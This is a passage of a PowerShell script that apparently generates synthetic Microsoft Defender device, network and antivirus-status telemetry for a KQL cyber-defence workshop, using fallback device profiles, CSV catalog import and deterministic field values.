            RemotePort = $remotePort
            RemoteUrl = $remoteUrl
            Protocol = $protocol
            LocalIPType = $localIPType
            RemoteIPType = $remoteIPType
            InitiatingProcessFileName = $processName
        }

        if ([string]::IsNullOrWhiteSpace($profile.RemoteIP) -and [string]::IsNullOrWhiteSpace($profile.RemoteUrl)) {
            continue
        }

        $key = @(
            $profile.ActionType,
            $profile.RemoteIP,
            $profile.RemotePort,
            $profile.RemoteUrl,
            $profile.Protocol,
            $profile.LocalIPType,
            $profile.RemoteIPType,
            $profile.InitiatingProcessFileName
        ) -join '|'

        if ($seen.Add($key)) {
            $profile
        }
    }
}

function Get-WorkshopPropertyText {
    param(
        [Parameter(Mandatory)]$InputObject,
        [Parameter(Mandatory)][string]$Name
    )

    $property = $InputObject.PSObject.Properties[$Name]
    if (-not $property -or $null -eq $property.Value) {
        return ''
    }

    return ([string]$property.Value).Trim()
}

function ConvertFrom-WorkshopBooleanText {
    param(
        [AllowEmptyString()][string]$Value = '',
        [bool]$Default = $false
    )

    $valueText = $Value.Trim()
    if ([string]::IsNullOrWhiteSpace($valueText)) {
        return $Default
    }

    if ($valueText -match '^(?i:true|1)$') {
        return $true
    }

    if ($valueText -match '^(?i:false|0)$') {
        return $false
    }

    return $Default
}

function ConvertFrom-WorkshopLongText {
    param(
        [AllowEmptyString()][string]$Value = '',
        [long]$Default = 0
    )

    $parsed = [long]0
    if ([long]::TryParse($Value.Trim(), [ref]$parsed)) {
        return $parsed
    }

    return $Default
}

function New-WorkshopDeviceInfoFallbackProfileCatalog {
    @(
        [pscustomobject]@{ ClientVersion = '10.8821.26200.8246'; OSArchitecture = '64-bit'; OSPlatform = 'Windows11'; OSBuild = '26200'; IsAzureADJoined = '0'; JoinType = 'Domain Joined'; OSVersion = '10.0'; MachineGroup = 'EUROPE'; OnboardingStatus = 'Onboarded'; DeviceCategory = 'Endpoint'; DeviceType = 'Workstation'; DeviceSubtype = 'Workstation'; Model = ''; Vendor = 'Microsoft'; OSDistribution = 'Windows11'; OSVersionInfo = '25H2'; SensorHealthState = 'Active'; IsExcluded = '0'; ExclusionReason = ''; ExposureLevel = 'Medium'; DeviceManualTags = ''; DeviceDynamicTags = '["Unified Sensor RPC Audit"]'; CloudPlatforms = ''; IsTransient = '0'; OsBuildRevision = '8246'; MitigationStatus = ''; ConnectivityType = 'Streamlined'; DiscoverySources = ''; FirmwareVersions = '' }
        [pscustomobject]@{ ClientVersion = '10.8805.26100.32522'; OSArchitecture = '64-bit'; OSPlatform = 'WindowsServer2025'; OSBuild = '26100'; IsAzureADJoined = '0'; JoinType = 'Domain Joined'; OSVersion = '10.0'; MachineGroup = 'XDR-LiveResponse-DomainControllers-ONLY'; OnboardingStatus = 'Onboarded'; DeviceCategory = 'Endpoint'; DeviceType = 'Server'; DeviceSubtype = 'Server'; Model = ''; Vendor = 'Microsoft'; OSDistribution = 'WindowsServer2025'; OSVersionInfo = '24H2'; SensorHealthState = 'Active'; IsExcluded = '0'; ExclusionReason = ''; ExposureLevel = 'Medium'; DeviceManualTags = ''; DeviceDynamicTags = '["Unified Sensor RPC Audit"]'; CloudPlatforms = '["Azure"]'; IsTransient = '0'; OsBuildRevision = '32522'; MitigationStatus = ''; ConnectivityType = 'Streamlined'; DiscoverySources = ''; FirmwareVersions = '' }
        [pscustomobject]@{ ClientVersion = '101.25042.0000'; OSArchitecture = '64-bit'; OSPlatform = 'Linux'; OSBuild = '4'; IsAzureADJoined = ''; JoinType = ''; OSVersion = '24.04'; MachineGroup = 'UnassignedGroup'; OnboardingStatus = 'Onboarded'; DeviceCategory = 'Endpoint'; DeviceType = 'Server'; DeviceSubtype = 'Server'; Model = ''; Vendor = 'Microsoft'; OSDistribution = 'Ubuntu'; OSVersionInfo = '24.4'; SensorHealthState = 'Active'; IsExcluded = '0'; ExclusionReason = ''; ExposureLevel = 'Medium'; DeviceManualTags = ''; DeviceDynamicTags = ''; CloudPlatforms = '["Azure"]'; IsTransient = '0'; OsBuildRevision = '58'; MitigationStatus = ''; ConnectivityType = 'Streamlined'; DiscoverySources = ''; FirmwareVersions = '' }
        [pscustomobject]@{ ClientVersion = '1.0'; OSArchitecture = '64-bit'; OSPlatform = 'Android'; OSBuild = '12'; IsAzureADJoined = ''; JoinType = ''; OSVersion = '12'; MachineGroup = 'Discovered'; OnboardingStatus = 'Unsupported'; DeviceCategory = 'IoT'; DeviceType = 'AudioAndVideo'; DeviceSubtype = 'SmartTV'; Model = 'SmartTV 4K'; Vendor = 'Hisense'; OSDistribution = 'EmbeddedOs'; OSVersionInfo = '12'; SensorHealthState = ''; IsExcluded = '0'; ExclusionReason = ''; ExposureLevel = 'None'; DeviceManualTags = ''; DeviceDynamicTags = '["Discovered"]'; CloudPlatforms = ''; IsTransient = '1'; OsBuildRevision = ''; MitigationStatus = ''; ConnectivityType = ''; DiscoverySources = ''; FirmwareVersions = '15.1.4' }
        [pscustomobject]@{ ClientVersion = '1.0'; OSArchitecture = '64-bit'; OSPlatform = 'Linux'; OSBuild = '3'; IsAzureADJoined = ''; JoinType = ''; OSVersion = '15'; MachineGroup = 'Discovered'; OnboardingStatus = 'Can be onboarded'; DeviceCategory = 'NetworkDevice'; DeviceType = 'NetworkDevice'; DeviceSubtype = 'Router'; Model = 'U6-Pro'; Vendor = 'Ubiquiti'; OSDistribution = 'UnifiOS'; OSVersionInfo = '15'; SensorHealthState = ''; IsExcluded = '0'; ExclusionReason = ''; ExposureLevel = 'None'; DeviceManualTags = ''; DeviceDynamicTags = '["Discovered"]'; CloudPlatforms = ''; IsTransient = '1'; OsBuildRevision = ''; MitigationStatus = ''; ConnectivityType = ''; DiscoverySources = ''; FirmwareVersions = '6.8.2.15592' }
        [pscustomobject]@{ ClientVersion = '1.0'; OSArchitecture = ''; OSPlatform = ''; OSBuild = ''; IsAzureADJoined = ''; JoinType = ''; OSVersion = ''; MachineGroup = 'Discovered'; OnboardingStatus = 'Insufficient info'; DeviceCategory = 'Unknown'; DeviceType = 'Unknown'; DeviceSubtype = ''; Model = ''; Vendor = ''; OSDistribution = ''; OSVersionInfo = ''; SensorHealthState = ''; IsExcluded = '0'; ExclusionReason = ''; ExposureLevel = 'None'; DeviceManualTags = ''; DeviceDynamicTags = '["Discovered"]'; CloudPlatforms = ''; IsTransient = '1'; OsBuildRevision = ''; MitigationStatus = ''; ConnectivityType = ''; DiscoverySources = ''; FirmwareVersions = '' }
    )
}

function Import-WorkshopDeviceInfoProfileCatalog {
    param([Parameter(Mandatory)][string]$Path)

    if (-not (Test-Path $Path)) {
        return @(New-WorkshopDeviceInfoFallbackProfileCatalog)
    }

    $profileColumns = @(
        'ClientVersion', 'OSArchitecture', 'OSPlatform', 'OSBuild', 'IsAzureADJoined', 'JoinType', 'OSVersion',
        'MachineGroup', 'OnboardingStatus', 'DeviceCategory', 'DeviceType', 'DeviceSubtype', 'Model', 'Vendor',
        'OSDistribution', 'OSVersionInfo', 'SensorHealthState', 'IsExcluded', 'ExclusionReason', 'ExposureLevel',
        'DeviceManualTags', 'DeviceDynamicTags', 'CloudPlatforms', 'IsTransient', 'OsBuildRevision',
        'MitigationStatus', 'ConnectivityType', 'DiscoverySources', 'FirmwareVersions'
    )
    $seen = [System.Collections.Generic.HashSet[string]]::new([StringComparer]::OrdinalIgnoreCase)
    $profiles = foreach ($row in (Import-Csv -Path $Path)) {
        $profile = [ordered]@{}
        foreach ($column in $profileColumns) {
            $profile[$column] = Get-WorkshopPropertyText -InputObject $row -Name $column
        }

        if ([string]::IsNullOrWhiteSpace($profile.OSPlatform) -and [string]::IsNullOrWhiteSpace($profile.DeviceCategory) -and [string]::IsNullOrWhiteSpace($profile.OnboardingStatus)) {
            continue
        }

        $key = ($profileColumns | ForEach-Object { $profile[$_] }) -join '|'
        if ($seen.Add($key)) {
            [pscustomobject]$profile
        }
    }

    if (@($profiles).Count -eq 0) {
        return @(New-WorkshopDeviceInfoFallbackProfileCatalog)
    }

    return @($profiles)
}

function Select-WorkshopDeviceInfoProfile {
    param(
        [Parameter(Mandatory)]$Device,
        [Parameter(Mandatory)][int]$Index,
        [switch]$Ambient
    )

    if (-not $deviceInfoProfiles -or $deviceInfoProfiles.Count -eq 0) {
        return $null
    }

    if ($Ambient) {
        return $deviceInfoProfiles[$Index % $deviceInfoProfiles.Count]
    }

    $profilePool = if ($Device.OS -eq 'Ubuntu') {
        $deviceInfoLinuxProfiles
    }
    elseif ($Device.Type -in @('DomainController', 'EntraConnect')) {
        $deviceInfoServerProfiles
    }
    else {
        $deviceInfoWindows11Profiles
    }

    if (-not $profilePool -or $profilePool.Count -eq 0) {
        $profilePool = $deviceInfoProfiles
    }

    return $profilePool[$Index % $profilePool.Count]
}

function New-WorkshopDeviceInfoDiscoverySources {
    param(
        [Parameter(Mandatory)][datetime]$Time,
        [Parameter(Mandatory)][string]$DeviceType,
        [AllowEmptyString()][string]$CloudPlatforms = '',
        [Parameter(Mandatory)][int]$Index
    )

    $date = $Time.ToUniversalTime().ToString('yyyy-MM-dd')
    $sources = [ordered]@{ 'Defender for Endpoint' = $date }
    if ($DeviceType -eq 'Server' -or ($Index % 7) -eq 0) {
        $sources['Defender for Identity'] = $Time.AddDays(-(($Index % 30) + 1)).ToUniversalTime().ToString('yyyy-MM-dd')
    }
    if (-not [string]::IsNullOrWhiteSpace($CloudPlatforms) -or ($Index % 3) -eq 0) {
        $sources['Defender for Cloud'] = $date
    }

    return ConvertTo-Json -InputObject $sources -Compress -Depth 4
}

function New-WorkshopDeviceInfoDlpInfo {
    param(
        [AllowEmptyString()][string]$UserPrincipalName = '',
        [bool]$Healthy = $true,
        [bool]$Enabled = $false,
        [bool]$HasValidUpn = $false
    )

    $dlpUpn = if ($HasValidUpn -and -not [string]::IsNullOrWhiteSpace($UserPrincipalName)) { $UserPrincipalName } else { $null }
    $info = [ordered]@{
        IsDlpConfigurationValid = $Healthy
        DlpPolicyLastModifiedTimeUTC = $null
        IsDlpEnabled = $Enabled
        IsDefenderRealTimeProtectionEnabled = $Healthy
        IsDefenderBehaviorMonitoringEnabled = $Healthy
        HasDlpACBandwidthExceeded = $false
        HasDlpValidUpn = $HasValidUpn
        DlpUpn = $dlpUpn
    }

    return ConvertTo-Json -InputObject $info -Compress -Depth 4
}

function New-WorkshopDeviceInfoValues {
    param(
        [Parameter(Mandatory)]$Device,
        [Parameter(Mandatory)][datetime]$Time,
        [Parameter(Mandatory)][int]$Index,
        [Parameter(Mandatory)]$User,
        [switch]$Ambient
    )

    $profile = Select-WorkshopDeviceInfoProfile -Device $Device -Index $Index -Ambient:$Ambient
    $timeText = Format-WorkshopTime $Time
    $isUbuntuDevice = $Device.OS -eq 'Ubuntu'
    $fallbackOsPlatform = if ($isUbuntuDevice) { 'Linux' } else { $Device.OS }
    $fallbackOsBuild = if ($Device.OS -eq 'Windows11') { 26200L } elseif ($Device.OS -like 'WindowsServer*') { 26100L } elseif ($isUbuntuDevice) { 4L } else { 0L }
    $fallbackOsDistribution = if ($isUbuntuDevice) { 'Ubuntu' } else { $Device.OS }
    $fallbackOsVersionInfo = if ($Device.OS -eq 'Windows11') { '25H2' } elseif ($Device.OS -like 'WindowsServer*') { '24H2' } elseif ($isUbuntuDevice) { '24.4' } else { '' }
    $fallbackDeviceType = if ($Device.Type -in @('DomainController', 'EntraConnect', 'LinuxServer')) { 'Server' } else { 'Workstation' }
    $fallbackMachineGroup = if ($Device.Type -eq 'DomainController') { 'XDR-LiveResponse-DomainControllers-ONLY' } elseif ($Device.Type -eq 'EntraConnect') { 'EUROPE' } elseif ($isUbuntuDevice) { 'UnassignedGroup' } elseif (($Index % 5) -eq 0) { 'KOREA' } else { 'EUROPE' }

    $osPlatform = if ($profile) { Get-WorkshopPropertyText $profile 'OSPlatform' } else { '' }
    if ([string]::IsNullOrWhiteSpace($osPlatform)) { $osPlatform = $fallbackOsPlatform }
    $deviceCategory = if ($profile) { Get-WorkshopPropertyText $profile 'DeviceCategory' } else { '' }
    if ([string]::IsNullOrWhiteSpace($deviceCategory)) { $deviceCategory = 'Endpoint' }
    $deviceType = if ($profile) { Get-WorkshopPropertyText $profile 'DeviceType' } else { '' }
    if ([string]::IsNullOrWhiteSpace($deviceType)) { $deviceType = $fallbackDeviceType }
    $deviceSubtype = if ($profile) { Get-WorkshopPropertyText $profile 'DeviceSubtype' } else { '' }
    if ([string]::IsNullOrWhiteSpace($deviceSubtype)) { $deviceSubtype = $deviceType }
    $onboardingStatus = if ($profile) { Get-WorkshopPropertyText $profile 'OnboardingStatus' } else { '' }
    if ([string]::IsNullOrWhiteSpace($onboardingStatus)) { $onboardingStatus = 'Onboarded' }

    $deviceName = $Device.Name
    $deviceId = $Device.DeviceId
    $publicIp = $Device.PublicIP
    if ($Ambient) {
        $prefix = switch ($deviceCategory) {
            'IoT' { 'iot' }
            'NetworkDevice' { 'net' }
            'Unknown' { 'unknown' }
            default { if ($deviceType -eq 'Server') { 'srv' } elseif ($osPlatform -eq 'Linux') { 'linux' } else { 'endpoint' } }
        }
        $deviceName = '{0}-{1:D5}.inventory.{2}' -f $prefix, $Index, $corpFqdn
        $deviceId = New-StableHex "DeviceInfo|$deviceName" 40
        $publicIp = if ($onboardingStatus -eq 'Onboarded' -and ($Index % 4) -eq 0) { '198.51.100.{0}' -f (20 + ($Index % 180)) } else { '' }
    }

    $osDistribution = if ($profile) { Get-WorkshopPropertyText $profile 'OSDistribution' } else { '' }
    if ([string]::IsNullOrWhiteSpace($osDistribution)) { $osDistribution = $fallbackOsDistribution }
    $osVersionInfo = if ($profile) { Get-WorkshopPropertyText $profile 'OSVersionInfo' } else { '' }
    if ([string]::IsNullOrWhiteSpace($osVersionInfo)) { $osVersionInfo = $fallbackOsVersionInfo }
    $osVersion = if ($profile) { Get-WorkshopPropertyText $profile 'OSVersion' } else { '' }
    if ([string]::IsNullOrWhiteSpace($osVersion)) { $osVersion = if ($isUbuntuDevice -or $osPlatform -eq 'Linux') { '24.04' } elseif ($osPlatform -like 'Windows*') { '10.0' } else { $osVersionInfo } }
    $machineGroup = if ($profile) { Get-WorkshopPropertyText $profile 'MachineGroup' } else { '' }
    if ([string]::IsNullOrWhiteSpace($machineGroup) -or -not $Ambient) { $machineGroup = $fallbackMachineGroup }
    $cloudPlatforms = if ($profile) { Get-WorkshopPropertyText $profile 'CloudPlatforms' } else { '' }
    if (-not $Ambient -and [string]::IsNullOrWhiteSpace($cloudPlatforms)) { $cloudPlatforms = '["Azure"]' }
    $hardwareUuid = New-StableGuid "hardware|$deviceId"
    $hasAzureResource = $cloudPlatforms -match 'Azure'
    $resourceGroup = if ($Device.Type -eq 'DomainController') { 'identity-tier0' } elseif ($Device.Type -eq 'EntraConnect') { 'hybrid-identity' } elseif ($isUbuntuDevice -or $osPlatform -eq 'Linux') { 'linux-mde' } else { 'workstations' }
    $azureResourceId = if ($hasAzureResource) { '/subscriptions/{0}/resourceGroups/{1}/providers/Microsoft.Compute/virtualMachines/{2}' -f $subscriptionId, $resourceGroup, ($deviceName.Split('.')[0]).ToLowerInvariant() } else { '' }
    $sensorHealth = if ($profile) { Get-WorkshopPropertyText $profile 'SensorHealthState' } else { '' }
    if ([string]::IsNullOrWhiteSpace($sensorHealth) -and $onboardingStatus -eq 'Onboarded') { $sensorHealth = if (($Index % 67) -eq 0) { 'Inactive' } else { 'Active' } }
    $exposureLevel = if ($profile) { Get-WorkshopPropertyText $profile 'ExposureLevel' } else { '' }
    if ([string]::IsNullOrWhiteSpace($exposureLevel)) { $exposureLevel = if ($onboardingStatus -eq 'Onboarded') { if ($Device.AssetValue -eq 'High') { 'Medium' } else { 'Low' } } else { 'None' } }
    $isExcludedText = if ($profile) { Get-WorkshopPropertyText $profile 'IsExcluded' } else { '' }
    $isExcluded = ConvertFrom-WorkshopBooleanText -Value $isExcludedText -Default:(($Index % 173) -eq 0)
    $exclusionReason = if ($profile) { Get-WorkshopPropertyText $profile 'ExclusionReason' } else { '' }
    if ($isExcluded -and [string]::IsNullOrWhiteSpace($exclusionReason)) { $exclusionReason = if (($Index % 2) -eq 0) { 'SystemMerged' } else { 'SystemOther' } }
    $isAzureJoined = ConvertFrom-WorkshopBooleanText -Value $(if ($profile) { Get-WorkshopPropertyText $profile 'IsAzureADJoined' } else { '' }) -Default:($onboardingStatus -eq 'Onboarded' -and $osPlatform -like 'Windows*' -and $Device.Type -ne 'DomainController')
    $joinType = if ($profile) { Get-WorkshopPropertyText $profile 'JoinType' } else { '' }
    if ([string]::IsNullOrWhiteSpace($joinType) -and $isAzureJoined) { $joinType = if (($Index % 4) -eq 0) { 'AAD Joined' } else { 'Domain Joined' } }
    $aadDeviceId = if ($isAzureJoined -or (-not $Ambient -and $Device.Type -ne 'DomainController')) { New-StableGuid "aad-device|$deviceId" } else { '' }
    $loggedOnUsers = if ($onboardingStatus -eq 'Onboarded' -and $deviceCategory -eq 'Endpoint' -and ($Index % 3) -eq 0) {
        ConvertTo-Json -InputObject @(@{ UserName = $User.Name; DomainName = if ($osPlatform -eq 'Linux') { $deviceName.Split('.')[0] } elseif ($isAzureJoined) { 'AzureAD' } else { $adDomain }; Sid = $User.Sid }) -Compress -Depth 4
    }
    else {
        '[]'
    }
    $discoverySources = New-WorkshopDeviceInfoDiscoverySources -Time $Time -DeviceType $deviceType -CloudPlatforms $cloudPlatforms -Index $Index
    $healthyDlp = $sensorHealth -ne 'Inactive'
    $dlpInfo = New-WorkshopDeviceInfoDlpInfo -UserPrincipalName $User.Upn -Healthy:$healthyDlp -Enabled:($Index % 11 -eq 0) -HasValidUpn:($onboardingStatus -eq 'Onboarded' -and $deviceCategory -eq 'Endpoint' -and ($Index % 4) -eq 0)

    @{
        TimeGenerated = $timeText
        Timestamp = $timeText
        DeviceId = $deviceId
        DeviceName = $deviceName
        ClientVersion = $(if ($profile) { $text = Get-WorkshopPropertyText $profile 'ClientVersion'; if ($text) { $text } elseif ($osPlatform -eq 'Linux') { '101.25042.0000' } else { '10.8821.26200.8246' } } elseif ($osPlatform -eq 'Linux') { '101.25042.0000' } else { '10.8821.26200.8246' })
        PublicIP = $publicIp
        OSArchitecture = $(if ($profile) { $text = Get-WorkshopPropertyText $profile 'OSArchitecture'; if ($text) { $text } else { '64-bit' } } else { '64-bit' })
        OSPlatform = $osPlatform
        OSBuild = ConvertFrom-WorkshopLongText -Value $(if ($profile) { Get-WorkshopPropertyText $profile 'OSBuild' } else { '' }) -Default $fallbackOsBuild
        IsAzureADJoined = $isAzureJoined
        JoinType = $joinType
        AadDeviceId = $aadDeviceId
        LoggedOnUsers = $loggedOnUsers
        RegistryDeviceTag = ''
        OSVersion = $osVersion
        MachineGroup = $machineGroup
        ReportId = 639132700000000000L + $Index
        OnboardingStatus = $onboardingStatus
        AdditionalFields = if (-not $Ambient -and $Device.ShortName -eq 'UBUNTU-05') { '{"Workshop":"CyberDefenseKQL","Sensor":"MDE","Distribution":"Ubuntu 24.04 LTS","KernelVersion":"6.8.0-58-generic","Role":"OracleDatabase","OracleSid":"ORCL"}' } elseif (-not $Ambient -and $isUbuntuDevice) { '{"Workshop":"CyberDefenseKQL","Sensor":"MDE","Distribution":"Ubuntu 24.04 LTS","KernelVersion":"6.8.0-58-generic"}' } else { '' }
        DeviceCategory = $deviceCategory
        DeviceType = $deviceType
        DeviceSubtype = $deviceSubtype
        Model = $(if ($profile) { Get-WorkshopPropertyText $profile 'Model' } else { '' })
        Vendor = $(if ($profile) { $text = Get-WorkshopPropertyText $profile 'Vendor'; if ($text) { $text } elseif ($deviceCategory -eq 'Endpoint') { 'Microsoft' } else { '' } } elseif ($deviceCategory -eq 'Endpoint') { 'Microsoft' } else { '' })
        OSDistribution = $osDistribution
        OSVersionInfo = $osVersionInfo
        MergedDeviceIds = if (($Index % 11) -eq 0) { ConvertTo-Json -InputObject @((New-StableHex "merged|$deviceId|$Index" 40)) -Compress } else { '' }
        MergedToDeviceId = if (($Index % 197) -eq 0) { New-StableHex "merged-to|$deviceId|$Index" 40 } else { '' }
        IsInternetFacing = $false
        SensorHealthState = $sensorHealth
        IsExcluded = $isExcluded
        ExclusionReason = $exclusionReason
        ExposureLevel = $exposureLevel
        AssetValue = if (-not $Ambient) { $Device.AssetValue } else { '' }
        DeviceManualTags = $(if ($profile) { Get-WorkshopPropertyText $profile 'DeviceManualTags' } elseif (-not $Ambient -and $Device.ShortName -eq 'WIN11-04') { '["ForensicCollect"]' } else { '' })
        DeviceDynamicTags = $(if ($profile) { Get-WorkshopPropertyText $profile 'DeviceDynamicTags' } elseif ($Device.Type -in @('DomainController', 'EntraConnect')) { '["Unified Sensor RPC Audit"]' } else { '' })
        HardwareUuid = $hardwareUuid
        CloudPlatforms = $cloudPlatforms
        AzureVmId = if ($hasAzureResource) { $hardwareUuid } else { '' }
        AzureResourceId = $azureResourceId
        AzureVmSubscriptionId = if ($hasAzureResource) { $subscriptionId } else { '' }
        GcpFullResourceName = ''
        AwsResourceName = ''
        IsTransient = ConvertFrom-WorkshopBooleanText -Value $(if ($profile) { Get-WorkshopPropertyText $profile 'IsTransient' } else { '' }) -Default:($Ambient -and $onboardingStatus -ne 'Onboarded')
        OsBuildRevision = $(if ($profile) { $text = Get-WorkshopPropertyText $profile 'OsBuildRevision'; if ($text) { $text } elseif ($Device.OS -eq 'Windows11') { '8246' } elseif ($Device.OS -like 'WindowsServer*') { '32522' } else { '58' } } elseif ($Device.OS -eq 'Windows11') { '8246' } elseif ($Device.OS -like 'WindowsServer*') { '32522' } else { '58' })
        HostDeviceId = ''
        MitigationStatus = $(if ($profile) { Get-WorkshopPropertyText $profile 'MitigationStatus' } else { '' })
        ConnectivityType = $(if ($profile) { $text = Get-WorkshopPropertyText $profile 'ConnectivityType'; if ($text) { $text } elseif ($onboardingStatus -eq 'Onboarded') { 'Streamlined' } else { '' } } elseif ($onboardingStatus -eq 'Onboarded') { 'Streamlined' } else { '' })
        DiscoverySources = $discoverySources
        FirmwareVersions = $(if ($profile) { Get-WorkshopPropertyText $profile 'FirmwareVersions' } else { '' })
        DlpInfo = $dlpInfo
        TenantId = ''
        Type = 'DeviceInfo'
        SourceSystem = ''
    }
}

function Resolve-WorkshopDeviceNetworkProcessProfile {
    param(
        [Parameter(Mandatory)][string]$FileName,
        [Parameter(Mandatory)][string]$UserName
    )

    $template = @($windowsProcessTemplates | Where-Object { $_.File -ieq $FileName } | Select-Object -First 1)
    if ($template.Count -gt 0) {
        $command = if ($template[0].Command -like '*{0}*') { $template[0].Command -f $UserName } else { $template[0].Command }
        return [pscustomobject]@{
            File = $template[0].File
            Path = Resolve-WorkshopTemplatePath -Template $template[0] -UserName $UserName
            Parent = $template[0].Parent
            Command = $command
        }
    }

    $lowerName = $FileName.ToLowerInvariant()
    $folder = switch -Regex ($lowerName) {
        '^(lsass|svchost|ntoskrnl|dsregcmd|backgroundtaskhost|backgroundtransferhost|mousocoreworker|sihclient|shellexperiencehost|searchhost|startmenuexperiencehost)\.exe$' { 'C:\Windows\System32'; break }
        '^(msedge|msedgewebview2|microsoftedgeupdate)\.exe$' { 'C:\Program Files (x86)\Microsoft\Edge\Application'; break }
        '^(excel|outlook|winword|powerpnt|officec2rclient|officeclicktorun|officesetup|officesvcmgr|m365copilot|microsoft\.sharepoint)\.exe$' { 'C:\Program Files\Microsoft Office\root\Office16'; break }
        '^(code|storageexplorer|claude)\.exe$' { 'C:\Users\{0}\AppData\Local\Programs\{1}' -f $UserName, ($FileName -replace '\.exe$', ''); break }
        '^(mssense|senseidentity|msmpeng|mpcmdrun|mpdefendercoreservice)\.exe$' { 'C:\Program Files\Windows Defender Advanced Threat Protection'; break }
        default { 'C:\Program Files\USAG Cyber\Applications' }
    }

    [pscustomobject]@{
        File = $FileName
        Path = '{0}\{1}' -f $folder, $FileName
        Parent = if ($lowerName -in @('lsass.exe', 'svchost.exe', 'ntoskrnl.exe')) { 'services.exe' } else { 'explorer.exe' }
        Command = $FileName
    }
}

function Assert-WorkshopCatalogMinimum {
    param(
        [Parameter(Mandatory)][string]$Name,
        [Parameter(Mandatory)][object[]]$Items,
        [Parameter(Mandatory)][int]$Minimum
    )

    if ($Items.Count -lt $Minimum) {
        throw "$Name catalog expected at least $Minimum item(s), found $($Items.Count)."
    }
}

function Resolve-WorkshopTemplatePath {
    param(
        [Parameter(Mandatory)]$Template,
        [Parameter(Mandatory)][string]$UserName
    )

    $pathTemplateProperty = $Template.PSObject.Properties['PathTemplate']
    if ($pathTemplateProperty) {
        return $pathTemplateProperty.Value -f $UserName
    }

    $pathProperty = $Template.PSObject.Properties['Path']
    if ($pathProperty) {
        return $pathProperty.Value
    }

    throw "Template '$($Template | ConvertTo-Json -Compress)' does not include Path or PathTemplate."
}

function New-WorkshopNormalTime {
    $minutesBack = Get-WorkshopRandomInt -Minimum 1 -Maximum ([Math]::Max(2, $NormalLookbackDays * 24 * 60))
    $seconds = Get-WorkshopRandomInt -Minimum 0 -Maximum 60
    return $script:TelemetryEndTime.AddMinutes(-$minutesBack).AddSeconds($seconds)
}

function New-WorkshopTvmInfoGatheringFields {
    param(
        [Parameter(Mandatory)]$Device,
        [Parameter(Mandatory)][datetime]$Time,
        [Parameter(Mandatory)][int]$Index
    )

    $isWindowsDevice = [string]$Device.OS -like 'Windows*'
    $isLinuxDevice = [string]$Device.OS -eq 'Ubuntu'
    $signatureTime = Format-WorkshopTime $Time.AddHours(-($Index % 24)).AddMinutes(-17)
    $engineTime = Format-WorkshopTime $Time.AddHours(-(($Index % 18) + 1)).AddMinutes(-9)
    $platformTime = Format-WorkshopTime $Time.AddDays(-(($Index % 21) + 1)).AddMinutes(-33)
    $refreshTime = Format-WorkshopTime $Time.AddMinutes(-(($Index % 90) + 5))

    $asrStates = if ($isWindowsDevice) {
        [ordered]@{
            ExecutableEmailContent = if (($Index % 9) -eq 0) { 'Audit' } else { 'Off' }
            OfficeChildProcess = if (($Index % 11) -eq 0) { 'Block' } else { 'Off' }
            ExecutableOfficeContent = 'Off'
            OfficeProcessInjection = if (($Index % 13) -eq 0) { 'Audit' } else { 'Off' }
            ScriptExecutableDownload = 'Off'
            ObfuscatedScript = if (($Index % 7) -eq 0) { 'Audit' } else { 'Off' }
            OfficeMacroWin32ApiCalls = 'Off'
            UntrustedExecutable = 'Off'
            Ransomware = if (($Index % 17) -eq 0) { 'Block' } else { 'Off' }
            LsassCredentialTheft = if (($Index % 5) -eq 0) { 'Block' } else { 'Off' }
            PsexecWmiChildProcess = 'Off'
            UntrustedUsbProcess = 'Off'
            OfficeCommAppChildProcess = 'Off'
            AdobeReaderChildProcess = 'Off'
            PersistenceThroughWmi = 'Off'
            VulnerableSignedDriver = if (($Index % 19) -eq 0) { 'Audit' } else { 'Off' }
            BlockWebshellCreation = $null
            BlockCopiedOrImpersonatedSystemTools = 'Off'
            BlockSafeModeReboot = 'Off'
        }
    }
    else {
        $null
    }

    $scanResults = if ($isWindowsDevice) {
        [ordered]@{
            Quick = [ordered]@{
                ScanStatus = 'Completed'
                ErrorCode = $null
                Timestamp = Format-WorkshopTime $Time.AddHours(-(($Index % 36) + 2))
            }
            Full = $null
            Custom = $null
        }
    }
    else {
        $null
    }

    [ordered]@{
        AvPlatformVersion = if ($isWindowsDevice) { '4.18.26030.3011' } elseif ($isLinuxDevice) { '101.25042.0000' } else { $null }
        AvModeDataRefreshTime = if ($isWindowsDevice -or $isLinuxDevice) { $refreshTime } else { $null }
        Log4j_CVE_2021_44228 = $null
        LocalCveScannerExecuted = if ($isWindowsDevice -or $isLinuxDevice) { 'CVE-2021-44228' } else { $null }
        Log4jLocalScanVulnerable = $null
        AvEngineUpdateTime = if ($isWindowsDevice -or $isLinuxDevice) { $engineTime } else { $null }
        AvSignatureUpdateTime = if ($isWindowsDevice -or $isLinuxDevice) { $signatureTime } else { $null }
        AvPlatformUpdateTime = if ($isWindowsDevice -or $isLinuxDevice) { $platformTime } else { $null }
        AvIsSignatureUptoDate = if ($isWindowsDevice -or $isLinuxDevice) { $true } else { $null }
        AvIsEngineUptodate = if ($isWindowsDevice -or $isLinuxDevice) { $true } else { $null }
        AvIsPlatformUptodate = if ($isWindowsDevice -or $isLinuxDevice) { $true } else { $null }
        WdavorHeartbeatEventType = if ($isWindowsDevice) { 'WdavEvent' } elseif ($isLinuxDevice) { 'MdatpHealth' } else { $null }
        AvSignaturePublishTime = if ($isWindowsDevice -or $isLinuxDevice) { $signatureTime } else { $null }
        AvPlatformPublishTime = if ($isWindowsDevice -or $isLinuxDevice) { $platformTime } else { $null }
        AvEnginePublishTime = if ($isWindowsDevice -or $isLinuxDevice) { $engineTime } else { $null }
        AvSignatureRing = if ($isWindowsDevice -or $isLinuxDevice) { '5' } else { $null }
        AvPlatformRing = if ($isWindowsDevice -or $isLinuxDevice) { '5' } else { $null }
        AvEngineRing = if ($isWindowsDevice -or $isLinuxDevice) { '5' } else { $null }
        Spring4Shell_CVE_2022_22965 = $null
        Bootiful_Mind_status = if ($isWindowsDevice -or $isLinuxDevice) { 'NotFound' } else { $null }
        AvSignatureDataRefreshTime = if ($isWindowsDevice -or $isLinuxDevice) { $refreshTime } else { $null }
        EBPFStatus = if ($isLinuxDevice) { 'Enabled' } else { $null }
        AvMode = if ($isWindowsDevice -or $isLinuxDevice) { '0' } else { $null }
        AvEngineVersion = if ($isWindowsDevice) { '1.1.26030.3008' } elseif ($isLinuxDevice) { '1.1.25040.2' } else { $null }
        AvSignatureVersion = if ($isWindowsDevice -or $isLinuxDevice) { '1.449.{0}.0' -f (300 + ($Index % 200)) } else { $null }
        AvScanResults = $scanResults
        CloudProtectionState = if ($isWindowsDevice) { '2' } elseif ($isLinuxDevice) { 'Enabled' } else { $null }
        SslClient20 = $null
        SslClient30 = $null
        SslServer20 = $null
        SslServer30 = $null
